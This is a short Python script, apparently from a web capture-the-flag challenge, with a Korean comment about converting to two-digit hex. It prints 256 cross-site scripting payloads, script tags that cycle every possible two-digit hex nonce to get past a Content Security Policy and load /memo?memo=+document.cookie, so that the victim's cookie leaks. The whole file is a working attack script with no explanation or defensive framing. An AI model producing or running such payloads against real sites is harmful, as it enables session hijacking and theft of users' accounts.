for i in range(256):
    hex_value = format(i, '02X')  # 16진수로 변환하고 두 자리로 표현
    print(f'<script nonce="{hex_value}" src=/memo?memo=+document.cookie></script>')

